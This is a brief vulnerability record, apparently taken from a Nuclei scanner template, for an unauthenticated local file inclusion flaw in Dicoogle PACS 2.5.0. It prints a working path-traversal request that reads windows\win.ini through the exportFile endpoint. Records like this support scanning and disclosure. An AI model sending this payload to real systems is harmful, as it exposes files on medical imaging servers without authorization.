# Vulnerability: Dicoogle PACS 2.5.0 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`dicoogle-pacs-lfi.yaml`)

## Description
Dicoogle PACS 2.5.0 is vulnerable to local file inclusion. This allows an attacker to read arbitrary files that the web user has access to. Admin credentials aren't required.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/exportFile?UID=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
```

